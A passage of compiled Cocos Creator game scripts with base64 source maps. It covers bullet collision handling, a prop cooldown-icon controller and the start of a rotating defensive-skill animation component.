BkaXN0YW5jZTpudW1iZXIsIHNwZWVkOm51bWJlcil7XHJcbiAgICAgICAgdGhpcy5ub2RlLnJvdGF0aW9uID0gOTAgLSBjYy5taXNjLnJhZGlhbnNUb0RlZ3JlZXMoTWF0aC5hdGFuMihkaXIueSwgZGlyLngpKTtcclxuICAgICAgICB0aGlzLm5vZGUucnVuQWN0aW9uKGNjLnNlcXVlbmNlKGNjLm1vdmVCeShkaXN0YW5jZS9zcGVlZCwgZGlyLm11bChkaXN0YW5jZSkpLCBjYy5jYWxsRnVuYygoKT0+e1xyXG4gICAgICAgICAgICB0aGlzLm5vZGUuYWN0aXZlID0gZmFsc2U7XHJcbiAgICAgICAgfSkpKTtcclxuICAgIH1cclxuXHJcbiAgICBvbkVuYWJsZSgpe1xyXG4gICAgICAgIHdpbmRvd1snR2FtZUJ1bGxldHNDb250cm9sbGVyJ10ucm9sZUJ1bGxldHMucHVzaCh0aGlzKTtcclxuICAgIH1cclxuXHJcbiAgICBvbkRpc2FibGUoKXtcclxuICAgICAgICB0aGlzLm5vZGUuc3RvcEFsbEFjdGlvbnMoKTtcclxuICAgICAgICB0aGlzLl9jb250YWN0cy5sZW5ndGggPSAwO1xyXG4gICAgICAgIGxldCBnYW1lQnVsbGV0c0NvbnRyb2xsZXIgPSB3aW5kb3dbJ0dhbWVCdWxsZXRzQ29udHJvbGxlciddO1xyXG4gICAgICAgIGdhbWVCdWxsZXRzQ29udHJvbGxlci5yb2xlQnVsbGV0cy5zcGxpY2UoZ2FtZUJ1bGxldHNDb250cm9sbGVyLnJvbGVCdWxsZXRzLmluZGV4T2YodGhpcyksIDEpO1xyXG4gICAgfVxyXG5cclxuICAgIHByb3RlY3RlZCBnZXRTdHJpa2VQb3Mob3RoZXIsIHNlbGYpOmNjLlZlYzJ7XHJcbiAgICAgICAgbGV0IG90aGVyQUFCQiA9IG90aGVyLndvcmxkLmFhYmI7XHJcbiAgICAgICAgbGV0IHNlbGZBQUJCID0gc2VsZi53b3JsZC5hYWJiO1xyXG4gICAgICAgIC8vIGNvbnNvbGUubG9nKFwib3RoZXJBQUJCPT0+XCIsIG90aGVyQUFCQik7XHJcbiAgICAgICAgLy8gY29uc29sZS5sb2coXCJzZWxmQUFCQj09PlwiLCBzZWxmQUFCQik7XHJcbiAgICAgICAgLy8gY29uc29sZS5sb2coXCI9PT09PT09PT09PT09PT09PT09XCIpO1xyXG5cclxuICAgICAgICAvKiog5pa55rOV5LiAICovXHJcbiAgICAgICAgLyoqIOWPluWMheWbtOebkueahOmdouenr+WBmuavlOi+g++8jOWGs+etlueisOaSnueCue+8jOaSreaUvueisOaSnuWKqOeUu1xyXG4gICAgICAgICAqIDEu5oCq54mp5q+U5a2Q5by55aSn5b6I5aSa5pe25bCx5Zyo5a2Q5by555qE5L2N572u5pKt5pS+XHJcbiAgICAgICAgICogMi7lrZDlvLnmr5TmgKrnianlpKflvojlpJrml7blnKjmgKrniannmoTkvY3nva7mkq3mlL5cclxuICAgICAgICAgKiAzLuWkp+Wwj+W3ruS4jeWkmuaXtuWPluS4reeCuSjlsI/kuo4wLjXlgI3liJnlj5bkuK3ngrkpXHJcbiAgICAgICAgICogKi9cclxuICAgICAgICAvLyBsZXQgcmF0ZSA9IDEuNTtcclxuICAgICAgICAvLyBsZXQgc2VsZkFyZWEgPSBzZWxmLndvcmxkLmFhYmIud2lkdGggKiBzZWxmLndvcmxkLmFhYmIuaGVpZ2h0O1xyXG4gICAgICAgIC8vIGxldCBvdGhlckFyZWEgPSBvdGhlci53b3JsZC5hYWJiLndpZHRoICogb3RoZXIud29ybGQuYWFiYi5oZWlnaHQ7XHJcbiAgICAgICAgLy8gbGV0IHN0cmlrZVBvcyA9IGNjLnYyKCk7XHJcbiAgICAgICAgLy8gaWYgKHNlbGZBcmVhID4gb3RoZXJBcmVhKXtcclxuICAgICAgICAvLyAgICAgaWYgKHNlbGZBcmVhL290aGVyQXJlYSA+IHJhdGUpe1xyXG4gICAgICAgIC8vICAgICAgICAgLyoqIOWPlm90aGVy6IqC54K555qE5L2N572uICovXHJcbiAgICAgICAgLy8gICAgICAgICBzdHJpa2VQb3MgPSBvdGhlci53b3JsZC5hYWJiLmNlbnRlcjtcclxuICAgICAgICAvLyAgICAgfSBlbHNlIHtcclxuICAgICAgICAvLyAgICAgICAgIC8qKiDlj5bkuK3lv4PngrkgKi9cclxuICAgICAgICAvLyAgICAgfVxyXG4gICAgICAgIC8vIH1lbHNlIHtcclxuICAgICAgICAvLyAgICAgaWYgKG90aGVyQXJlYS9zZWxmQXJlYSA+IHJhdGUpe1xyXG4gICAgICAgIC8vICAgICAgICAgLyoqIOWPlnNlbGboioLngrnnmoTkvY3nva4gKi9cclxuICAgICAgICAvLyAgICAgfSBlbHNlIHtcclxuICAgICAgICAvLyAgICAgICAgIC8qKiDlj5bkuK3lv4PngrkgKi9cclxuICAgICAgICAvLyAgICAgfVxyXG4gICAgICAgIC8vIH1cclxuICAgICAgICAvKiog5pa55rOV5LqMICovXHJcbiAgICAgICAgLyoqIOeUqGFhYmLljIXlm7Tnm5LliKTmlq3norDmkp7ngrkgKi9cclxuICAgICAgICAvLyBsZXQgc2VsZkRpciA9IHNlbGZBQUJCLmNlbnRlci5zdWIoc2VsZi53b3JsZC5wcmVBYWJiLmNlbnRlcikubm9ybWFsaXplKCk7XHJcbiAgICAgICAgLy/omb3nhLblj6/ku6XnlKjlrZDlvLnnmoTnp7vliqjmlrnlkJHkuI7niankvZPnmoTngrnpm4blgZrov5DnrpfvvIzorqHnrpflh7rovrnnlYznorDmkp7kvY3nva7vvIzkvYbmmK/lrZDlvLnlt7Lnu4/po57ov4fkuobov5nkuKrkvY3nva7vvIzlho3lnKjlhbbku5bkvY3nva7mkq3mlL7lh7vkuK3mlYjmnpzmm7TnqoHlhYAuXHJcbiAgICAgICAgLyoqIOawtOW5s+aWueWQkSAqL1xyXG4gICAgICAgIGxldCBzdHJpa2VQb3MgPSBjYy52MigpO1xyXG4gICAgICAgIGlmIChzZWxmQUFCQi54TWluID49IG90aGVyQUFCQi54TWluICYmIHNlbGZBQUJCLnhNYXggPD0gb3RoZXJBQUJCLnhNYXgpe1xyXG4gICAgICAgICAgICBzdHJpa2VQb3MueCA9IHNlbGZBQUJCLmNlbnRlci54O1xyXG4gICAgICAgIH1lbHNlIGlmIChzZWxmQUFCQi54TWF4IDw9IG90aGVyQUFCQi5jZW50ZXIueCAmJiBzZWxmQUFCQi54TWluIDwgb3RoZXJBQUJCLnhNaW4pe1xyXG4gICAgICAgICAgICBzdHJpa2VQb3MueCA9IHNlbGZBQUJCLnhNYXg7XHJcbiAgICAgICAgfWVsc2UgaWYgKHNlbGZBQUJCLnhNaW4gPj0gb3RoZXJBQUJCLmNlbnRlci54ICYmIHNlbGZBQUJCLnhNYXggPiBvdGhlckFBQkIueE1heCl7XHJcbiAgICAgICAgICAgIHN0cmlrZVBvcy54ID0gc2VsZkFBQkIueE1pbjtcclxuICAgICAgICB9ZWxzZSB7XHJcbiAgICAgICAgICAgIHN0cmlrZVBvcy54ID0gb3RoZXJBQUJCLmNlbnRlci54O1xyXG4gICAgICAgIH1cclxuXHJcbiAgICAgICAgLyoqIOWeguebtOaWueWQkSAqL1xyXG4gICAgICAgIGlmIChzZWxmQUFCQi55TWluID49IG90aGVyQUFCQi55TWluICYmIHNlbGZBQUJCLnlNYXggPD0gb3RoZXJBQUJCLnlNYXgpe1xyXG4gICAgICAgICAgICBzdHJpa2VQb3MueSA9IHNlbGZBQUJCLmNlbnRlci55O1xyXG4gICAgICAgIH1lbHNlIGlmIChzZWxmQUFCQi55TWF4IDw9IG90aGVyQUFCQi5jZW50ZXIueSAmJiBzZWxmQUFCQi55TWluIDwgb3RoZXJBQUJCLnlNaW4pe1xyXG4gICAgICAgICAgICBzdHJpa2VQb3MueSA9IHNlbGZBQUJCLnlNYXg7XHJcbiAgICAgICAgfWVsc2UgaWYgKHNlbGZBQUJCLnlNaW4gPj0gb3RoZXJBQUJCLmNlbnRlci55ICYmIHNlbGZBQUJCLnlNYXggPiBvdGhlckFBQkIueU1heCl7XHJcbiAgICAgICAgICAgIHN0cmlrZVBvcy55ID0gc2VsZkFBQkIueU1pbjtcclxuICAgICAgICB9ZWxzZSB7XHJcbiAgICAgICAgICAgIHN0cmlrZVBvcy55ID0gb3RoZXJBQUJCLmNlbnRlci55O1xyXG4gICAgICAgIH1cclxuXHJcbiAgICAgICAgcmV0dXJuIHN0cmlrZVBvcztcclxuICAgIH1cclxuXHJcbiAgICAvKiog5Yib5bu6c3RyaWtlICovXHJcbiAgICBzdHJpa2Uob3RoZXIsIHNlbGYpe1xyXG4gICAgICAgIGxldCBidWxsZXRTdHJpa2UgPSB3aW5kb3dbJ0dhbWVCdWxsZXRzQ29udHJvbGxlciddLmdldEluYWN0aXZlQnVsbGV0U3RyaWtlKHRoaXMuYnVsbGV0SWQpO1xyXG4gICAgICAgIGJ1bGxldFN0cmlrZS5ub2RlLmFjdGl2ZSA9IHRydWU7XHJcbiAgICAgICAgYnVsbGV0U3RyaWtlLm5vZGUucG9zaXRpb24gPSB0aGlzLmdldFN0cmlrZVBvcyhvdGhlciwgc2VsZik7XHJcbiAgICAgICAgYnVsbGV0U3RyaWtlLm5vZGUucm90YXRpb24gPSB0aGlzLm5vZGUucm90YXRpb247XHJcbiAgICAgICAgYnVsbGV0U3RyaWtlLnN0cmlrZSgpO1xyXG4gICAgfVxyXG5cclxuICAgIGRvUmVwZWFsKGVuZW15LCByZXBlbCl7XHJcbiAgICAgICAgZW5lbXkuZG9SZXBlbCh0aGlzLm1vdmVEaXIsIHJlcGVsKTtcclxuICAgIH1cclxuXHJcbiAgICAvKipcclxuICAgICAqIOW9k+eisOaSnuS6p+eUn+eahOaXtuWAmeiwg+eUqFxyXG4gICAgICogICovXHJcbiAgICBwcm90ZWN0ZWQgY29sbGlzaW9uRW5lbXkob3RoZXIsIHNlbGYpe1xyXG4gICAgICAgIHRoaXMuc3RyaWtlKG90aGVyLCBzZWxmKTtcclxuICAgICAgICBsZXQgZW5lbXkgPSBvdGhlci5nZXRDb21wb25lbnQoJ0VuZW15Jyk7XHJcbiAgICAgICAgLyoqIOWDteehrCAqL1xyXG4gICAgICAgIGlmICh0aGlzLnN0aWZmID4gMCl7XHJcbiAgICAgICAgICAgIGVuZW15LmRvU3RpZmYodGhpcy5zdGlmZik7XHJcbiAgICAgICAgfVxyXG4gICAgICAgIC8qKiDlh4/pgJ8gKi9cclxuICAgICAgICBlbmVteS5kb1NwZWVkY3V0KCk7XHJcbiAgICAgICAgLyoqIOWHu+mAgOaViOaenCAqL1xyXG4gICAgICAgIGxldCBzdWJSZXBlbCA9IHRoaXMucmVwZWwgLSBlbmVteS51bnJlcGVsO1xyXG4gICAgICAgIC8vIGxldCBzdWJSZXBlbCA9IDEwO1xyXG4gICAgICAgIGlmIChzdWJSZXBlbCA+IDApe1xyXG4gICAgICAgICAgICAvLyBjb25zb2xlLmxvZyhcIuWHu+mAgOaViOaenOKApuKApuOAglwiKTtcclxuICAgICAgICAgICAgdGhpcy5kb1JlcGVhbChlbmVteSwgc3ViUmVwZWwpO1xyXG4gICAgICAgIH1lbHNlIGlmIChlbmVteS5lbmVteUlEIDwgNykge1xyXG4gICAgICAgICAgICBlbmVteS5wbGF5QmVhdGVuQmFjaygpO1xyXG4gICAgICAgIH1cclxuXHJcbiAgICAgICAgLyoqIOmjmOihgOaViOaenCAqL1xyXG4gICAgICAgIGxldCBkYW1hZ2UgPSB0aGlzLmh1cnQ7XHJcbiAgICAgICAgaWYgKGRhbWFnZSA+IDApe1xyXG4gICAgICAgICAgICBlbmVteS5ocCAtPSBkYW1hZ2U7XHJcbiAgICAgICAgfVxyXG4gICAgfVxyXG5cclxuICAgIC8qKlxyXG4gICAgICog56Kw5pKe5aSE55CGXHJcbiAgICAgKiAqL1xyXG4gICAgb25Db2xsaXNpb25FbnRlciAob3RoZXIsIHNlbGYpIHtcclxuXHJcbiAgICAgICAgdGhpcy5jb2xsaXNpb25FbmVteShvdGhlciwgc2VsZik7XHJcblxyXG4gICAgICAgIGlmICghdGhpcy5iVGhyb3VnaHQpe1xyXG4gICAgICAgICAgICB0aGlzLm5vZGUuYWN0aXZlID0gZmFsc2U7XHJcbiAgICAgICAgfVxyXG5cclxuICAgICAgICAvLyBjb25zb2xlLmxvZygn5a2Q5by556Kw5pKeJyk7XHJcbiAgICB9XHJcblxyXG4gICAgLyoqXHJcbiAgICAgKiDlvZPnorDmkp7kuqfnlJ/lkI7vvIznorDmkp7nu5PmnZ/liY3nmoTmg4XlhrXkuIvvvIzmr4/mrKHorqHnrpfnorDmkp7nu5PmnpzlkI7osIPnlKhcclxuICAgICAqICovXHJcbiAgICBvbkNvbGxpc2lvblN0YXkob3RoZXIsIHNlbGYpe1xyXG5cclxuICAgIH1cclxuXHJcbiAgICAvKiog5b2T56Kw5pKe57uT5p2f5ZCO6LCD55SoICovXHJcbiAgICBvbkNvbGxpc2lvbkV4aXQob3RoZXIsIHNlbGYpe1xyXG5cclxuICAgIH1cclxuXHJcbn1cclxuXHJcblxyXG4iXX0=
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/entities/prop/PropStateController.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'ad6c7iO+p1G1qYI4btYwplX', 'PropStateController');
// script/app/entities/prop/PropStateController.ts

Object.defineProperty(exports, "__esModule", { value: true });
var CDTimer_1 = require("../../../../framework/component/CDTimer");
var GameProxy_1 = require("../../game/GameProxy");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var PropStateController = /** @class */ (function (_super) {
    __extends(PropStateController, _super);
    function PropStateController() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this.spriteFrames = [];
        _this.sprite = null;
        _this.prgressBar = null;
        _this.cdTimer = null;
        _this.propID = 0;
        return _this;
    }
    PropStateController.prototype.onEnable = function () {
        this.sprite.node.active = false;
        this.prgressBar.node.active = false;
    };
    PropStateController.prototype.onDisable = function () {
        this.node.stopAllActions();
    };
    PropStateController.prototype.init = function (id) {
        this.propID = id;
        var spriteFrameIndex = 0;
        var cd = 0;
        switch (id) {
            case 5:
                spriteFrameIndex = 0;
                cd = 15;
                break;
            case 9:
                spriteFrameIndex = 1;
                cd = 12;
                break;
            case 10:
                spriteFrameIndex = 2;
                cd = 12;
                break;
            case 12:
                spriteFrameIndex = 3;
                cd = 20;
                break;
            case 13:
                spriteFrameIndex = 4;
                cd = 10;
                break;
        }
        this.sprite.spriteFrame = this.spriteFrames[spriteFrameIndex];
        this.cdTimer.cd = cd;
        this.cdTimer.reset();
        this.prgressBar.progress = 1;
        this.cdTimer.pause = true;
        this.node.scale = 1;
        this.sprite.node.active = true;
        this.prgressBar.node.active = true;
    };
    PropStateController.prototype.onProgressEvent = function (progress) {
        this.prgressBar.progress = 1 - progress;
    };
    PropStateController.prototype.onZeroEvent = function () {
        var _this = this;
        GameProxy_1.GameProxy.emit(GameProxy_1.GameProxy.Event.PropCDZero, this.propID);
        this.node.runAction(cc.sequence(cc.scaleTo(0.15, 0), cc.callFunc(function () {
            _this.node.active = false;
        })));
    };
    __decorate([
        property(cc.SpriteFrame)
    ], PropStateController.prototype, "spriteFrames", void 0);
    __decorate([
        property(cc.Sprite)
    ], PropStateController.prototype, "sprite", void 0);
    __decorate([
        property(cc.ProgressBar)
    ], PropStateController.prototype, "prgressBar", void 0);
    __decorate([
        property(CDTimer_1.default)
    ], PropStateController.prototype, "cdTimer", void 0);
    PropStateController = __decorate([
        ccclass
    ], PropStateController);
    return PropStateController;
}(cc.Component));
exports.default = PropStateController;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2VudGl0aWVzL3Byb3AvUHJvcFN0YXRlQ29udHJvbGxlci50cyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiOzs7Ozs7Ozs7Ozs7Ozs7O0FBQ0EsbUVBQThEO0FBQzlELGtEQUErQztBQUV6QyxJQUFBLEtBQXNCLEVBQUUsQ0FBQyxVQUFVLEVBQWxDLE9BQU8sYUFBQSxFQUFFLFFBQVEsY0FBaUIsQ0FBQztBQUcxQztJQUFpRCx1Q0FBWTtJQUE3RDtRQUFBLHFFQXVFQztRQXBFRyxrQkFBWSxHQUFxQixFQUFFLENBQUM7UUFHcEMsWUFBTSxHQUFhLElBQUksQ0FBQztRQUd4QixnQkFBVSxHQUFrQixJQUFJLENBQUM7UUFHakMsYUFBTyxHQUFXLElBQUksQ0FBQztRQUV2QixZQUFNLEdBQUcsQ0FBQyxDQUFDOztJQXlEZixDQUFDO0lBdkRHLHNDQUFRLEdBQVI7UUFDSSxJQUFJLENBQUMsTUFBTSxDQUFDLElBQUksQ0FBQyxNQUFNLEdBQUcsS0FBSyxDQUFDO1FBQ2hDLElBQUksQ0FBQyxVQUFVLENBQUMsSUFBSSxDQUFDLE1BQU0sR0FBRyxLQUFLLENBQUM7SUFDeEMsQ0FBQztJQUVELHVDQUFTLEdBQVQ7UUFDSSxJQUFJLENBQUMsSUFBSSxDQUFDLGNBQWMsRUFBRSxDQUFDO0lBQy9CLENBQUM7SUFFRCxrQ0FBSSxHQUFKLFVBQUssRUFBUztRQUNWLElBQUksQ0FBQyxNQUFNLEdBQUcsRUFBRSxDQUFDO1FBQ2pCLElBQUksZ0JBQWdCLEdBQUcsQ0FBQyxDQUFDO1FBQ3pCLElBQUksRUFBRSxHQUFHLENBQUMsQ0FBQztRQUNYLFFBQVEsRUFBRSxFQUFDO1lBQ1AsS0FBSyxDQUFDO2dCQUNGLGdCQUFnQixHQUFHLENBQUMsQ0FBQztnQkFDckIsRUFBRSxHQUFHLEVBQUUsQ0FBQztnQkFDUixNQUFNO1lBQ1YsS0FBSyxDQUFDO2dCQUNGLGdCQUFnQixHQUFHLENBQUMsQ0FBQztnQkFDckIsRUFBRSxHQUFHLEVBQUUsQ0FBQztnQkFDUixNQUFNO1lBQ1YsS0FBSyxFQUFFO2dCQUNILGdCQUFnQixHQUFHLENBQUMsQ0FBQztnQkFDckIsRUFBRSxHQUFHLEVBQUUsQ0FBQztnQkFDUixNQUFNO1lBQ1YsS0FBSyxFQUFFO2dCQUNILGdCQUFnQixHQUFHLENBQUMsQ0FBQztnQkFDckIsRUFBRSxHQUFHLEVBQUUsQ0FBQztnQkFDUixNQUFNO1lBQ1YsS0FBSyxFQUFFO2dCQUNILGdCQUFnQixHQUFHLENBQUMsQ0FBQztnQkFDckIsRUFBRSxHQUFHLEVBQUUsQ0FBQztnQkFDUixNQUFNO1NBQ2I7UUFDRCxJQUFJLENBQUMsTUFBTSxDQUFDLFdBQVcsR0FBRyxJQUFJLENBQUMsWUFBWSxDQUFDLGdCQUFnQixDQUFDLENBQUM7UUFDOUQsSUFBSSxDQUFDLE9BQU8sQ0FBQyxFQUFFLEdBQUcsRUFBRSxDQUFDO1FBQ3JCLElBQUksQ0FBQyxPQUFPLENBQUMsS0FBSyxFQUFFLENBQUM7UUFDckIsSUFBSSxDQUFDLFVBQVUsQ0FBQyxRQUFRLEdBQUcsQ0FBQyxDQUFDO1FBQzdCLElBQUksQ0FBQyxPQUFPLENBQUMsS0FBSyxHQUFHLElBQUksQ0FBQztRQUMxQixJQUFJLENBQUMsSUFBSSxDQUFDLEtBQUssR0FBRyxDQUFDLENBQUM7UUFDcEIsSUFBSSxDQUFDLE1BQU0sQ0FBQyxJQUFJLENBQUMsTUFBTSxHQUFHLElBQUksQ0FBQztRQUMvQixJQUFJLENBQUMsVUFBVSxDQUFDLElBQUksQ0FBQyxNQUFNLEdBQUcsSUFBSSxDQUFDO0lBQ3ZDLENBQUM7SUFFRCw2Q0FBZSxHQUFmLFVBQWdCLFFBQWU7UUFDM0IsSUFBSSxDQUFDLFVBQVUsQ0FBQyxRQUFRLEdBQUcsQ0FBQyxHQUFHLFFBQVEsQ0FBQztJQUM1QyxDQUFDO0lBRUQseUNBQVcsR0FBWDtRQUFBLGlCQUtDO1FBSkcscUJBQVMsQ0FBQyxJQUFJLENBQUMscUJBQVMsQ0FBQyxLQUFLLENBQUMsVUFBVSxFQUFFLElBQUksQ0FBQyxNQUFNLENBQUMsQ0FBQztRQUN4RCxJQUFJLENBQUMsSUFBSSxDQUFDLFNBQVMsQ0FBQyxFQUFFLENBQUMsUUFBUSxDQUFDLEVBQUUsQ0FBQyxPQUFPLENBQUMsSUFBSSxFQUFFLENBQUMsQ0FBQyxFQUFFLEVBQUUsQ0FBQyxRQUFRLENBQUM7WUFDN0QsS0FBSSxDQUFDLElBQUksQ0FBQyxNQUFNLEdBQUcsS0FBSyxDQUFDO1FBQzdCLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQztJQUNULENBQUM7SUFuRUQ7UUFEQyxRQUFRLENBQUMsRUFBRSxDQUFDLFdBQVcsQ0FBQzs2REFDVztJQUdwQztRQURDLFFBQVEsQ0FBQyxFQUFFLENBQUMsTUFBTSxDQUFDO3VEQUNJO0lBR3hCO1FBREMsUUFBUSxDQUFDLEVBQUUsQ0FBQyxXQUFXLENBQUM7MkRBQ1E7SUFHakM7UUFEQyxRQUFRLENBQUMsaUJBQU8sQ0FBQzt3REFDSztJQVpOLG1CQUFtQjtRQUR2QyxPQUFPO09BQ2EsbUJBQW1CLENBdUV2QztJQUFELDBCQUFDO0NBdkVELEFBdUVDLENBdkVnRCxFQUFFLENBQUMsU0FBUyxHQXVFNUQ7a0JBdkVvQixtQkFBbUIiLCJmaWxlIjoiIiwic291cmNlUm9vdCI6Ii8iLCJzb3VyY2VzQ29udGVudCI6WyJcclxuaW1wb3J0IENEVGltZXIgZnJvbSBcIi4uLy4uLy4uLy4uL2ZyYW1ld29yay9jb21wb25lbnQvQ0RUaW1lclwiO1xyXG5pbXBvcnQge0dhbWVQcm94eX0gZnJvbSBcIi4uLy4uL2dhbWUvR2FtZVByb3h5XCI7XHJcblxyXG5jb25zdCB7Y2NjbGFzcywgcHJvcGVydHl9ID0gY2MuX2RlY29yYXRvcjtcclxuXHJcbkBjY2NsYXNzXHJcbmV4cG9ydCBkZWZhdWx0IGNsYXNzIFByb3BTdGF0ZUNvbnRyb2xsZXIgZXh0ZW5kcyBjYy5Db21wb25lbnQge1xyXG5cclxuICAgIEBwcm9wZXJ0eShjYy5TcHJpdGVGcmFtZSlcclxuICAgIHNwcml0ZUZyYW1lczogW2NjLlNwcml0ZUZyYW1lXSA9IFtdO1xyXG5cclxuICAgIEBwcm9wZXJ0eShjYy5TcHJpdGUpXHJcbiAgICBzcHJpdGU6Y2MuU3ByaXRlID0gbnVsbDtcclxuXHJcbiAgICBAcHJvcGVydHkoY2MuUHJvZ3Jlc3NCYXIpXHJcbiAgICBwcmdyZXNzQmFyOmNjLlByb2dyZXNzQmFyID0gbnVsbDtcclxuXHJcbiAgICBAcHJvcGVydHkoQ0RUaW1lcilcclxuICAgIGNkVGltZXI6Q0RUaW1lciA9IG51bGw7XHJcblxyXG4gICAgcHJvcElEID0gMDtcclxuXHJcbiAgICBvbkVuYWJsZSgpe1xyXG4gICAgICAgIHRoaXMuc3ByaXRlLm5vZGUuYWN0aXZlID0gZmFsc2U7XHJcbiAgICAgICAgdGhpcy5wcmdyZXNzQmFyLm5vZGUuYWN0aXZlID0gZmFsc2U7XHJcbiAgICB9XHJcblxyXG4gICAgb25EaXNhYmxlKCl7XHJcbiAgICAgICAgdGhpcy5ub2RlLnN0b3BBbGxBY3Rpb25zKCk7XHJcbiAgICB9XHJcblxyXG4gICAgaW5pdChpZDpudW1iZXIpe1xyXG4gICAgICAgIHRoaXMucHJvcElEID0gaWQ7XHJcbiAgICAgICAgbGV0IHNwcml0ZUZyYW1lSW5kZXggPSAwO1xyXG4gICAgICAgIGxldCBjZCA9IDA7XHJcbiAgICAgICAgc3dpdGNoIChpZCl7XHJcbiAgICAgICAgICAgIGNhc2UgNTpcclxuICAgICAgICAgICAgICAgIHNwcml0ZUZyYW1lSW5kZXggPSAwO1xyXG4gICAgICAgICAgICAgICAgY2QgPSAxNTtcclxuICAgICAgICAgICAgICAgIGJyZWFrO1xyXG4gICAgICAgICAgICBjYXNlIDk6XHJcbiAgICAgICAgICAgICAgICBzcHJpdGVGcmFtZUluZGV4ID0gMTtcclxuICAgICAgICAgICAgICAgIGNkID0gMTI7XHJcbiAgICAgICAgICAgICAgICBicmVhaztcclxuICAgICAgICAgICAgY2FzZSAxMDpcclxuICAgICAgICAgICAgICAgIHNwcml0ZUZyYW1lSW5kZXggPSAyO1xyXG4gICAgICAgICAgICAgICAgY2QgPSAxMjtcclxuICAgICAgICAgICAgICAgIGJyZWFrO1xyXG4gICAgICAgICAgICBjYXNlIDEyOlxyXG4gICAgICAgICAgICAgICAgc3ByaXRlRnJhbWVJbmRleCA9IDM7XHJcbiAgICAgICAgICAgICAgICBjZCA9IDIwO1xyXG4gICAgICAgICAgICAgICAgYnJlYWs7XHJcbiAgICAgICAgICAgIGNhc2UgMTM6XHJcbiAgICAgICAgICAgICAgICBzcHJpdGVGcmFtZUluZGV4ID0gNDtcclxuICAgICAgICAgICAgICAgIGNkID0gMTA7XHJcbiAgICAgICAgICAgICAgICBicmVhaztcclxuICAgICAgICB9XHJcbiAgICAgICAgdGhpcy5zcHJpdGUuc3ByaXRlRnJhbWUgPSB0aGlzLnNwcml0ZUZyYW1lc1tzcHJpdGVGcmFtZUluZGV4XTtcclxuICAgICAgICB0aGlzLmNkVGltZXIuY2QgPSBjZDtcclxuICAgICAgICB0aGlzLmNkVGltZXIucmVzZXQoKTtcclxuICAgICAgICB0aGlzLnByZ3Jlc3NCYXIucHJvZ3Jlc3MgPSAxO1xyXG4gICAgICAgIHRoaXMuY2RUaW1lci5wYXVzZSA9IHRydWU7XHJcbiAgICAgICAgdGhpcy5ub2RlLnNjYWxlID0gMTtcclxuICAgICAgICB0aGlzLnNwcml0ZS5ub2RlLmFjdGl2ZSA9IHRydWU7XHJcbiAgICAgICAgdGhpcy5wcmdyZXNzQmFyLm5vZGUuYWN0aXZlID0gdHJ1ZTtcclxuICAgIH1cclxuXHJcbiAgICBvblByb2dyZXNzRXZlbnQocHJvZ3Jlc3M6bnVtYmVyKXtcclxuICAgICAgICB0aGlzLnByZ3Jlc3NCYXIucHJvZ3Jlc3MgPSAxIC0gcHJvZ3Jlc3M7XHJcbiAgICB9XHJcblxyXG4gICAgb25aZXJvRXZlbnQoKXtcclxuICAgICAgICBHYW1lUHJveHkuZW1pdChHYW1lUHJveHkuRXZlbnQuUHJvcENEWmVybywgdGhpcy5wcm9wSUQpO1xyXG4gICAgICAgIHRoaXMubm9kZS5ydW5BY3Rpb24oY2Muc2VxdWVuY2UoY2Muc2NhbGVUbygwLjE1LCAwKSwgY2MuY2FsbEZ1bmMoKCk9PntcclxuICAgICAgICAgICAgdGhpcy5ub2RlLmFjdGl2ZSA9IGZhbHNlO1xyXG4gICAgICAgIH0pKSk7XHJcbiAgICB9XHJcbn1cclxuIl19
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/entities/role/ImpenetrableDefence.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '4cfaeeoywhMBKH2pNDKPKw0', 'ImpenetrableDefence');
// script/app/entities/role/ImpenetrableDefence.ts

Object.defineProperty(exports, "__esModule", { value: true });
var GameProxy_1 = require("../../game/GameProxy");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var ImpenetrableDefence = /** @class */ (function (_super) {
    __extends(ImpenetrableDefence, _super);
    function ImpenetrableDefence() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this.ske = null;
        _this.followNode = null;
        _this.rotateAction = null;
        //密不透风的防御(武术)
        _this._impenetrableDefenceCD = 0;
        _this._defenceCD = 0;
        return _this;
    }
    ImpenetrableDefence.prototype.onLoad = function () {
        var _this = this;
        this.followNode.on(cc.Node.EventType.POSITION_CHANGED, function () {
            _this.node.position = _this.followNode.position;
        });
        this.ske.setCompleteListener(function (trackEntry, loop) {
            var name = trackEntry.animation ? trackEntry.animation.name : '';
            if (name == "start") {
                _this.ske.setAnimation(0, "loops", true);
                _this.rotateAction = cc.speed(cc.repeatForever(cc.rotateBy(0.45, 360)), 0);
                _this.rotateAction.setTag(140);
                _this.node.runAction(_this.rotateAction);
            }
            else if (name == "transition") {
                _this.ske.setAnimation(0, "loops", true);
            }
        });
    };
    ImpenetrableDefence.prototype.start = function () {
        this.node.position = this.followNode.position;
    };
    Object.defineProperty(ImpenetrableDefence.prototype, "impenetrableDefenceCD", {
        set: function (value) {
            this._impenetrableDefenceCD = value;
            if (!this.node.active) {
                this.node.active = true;
                this.node.stopAllActions();
                this.ske.setAnimation(0, "start", false);
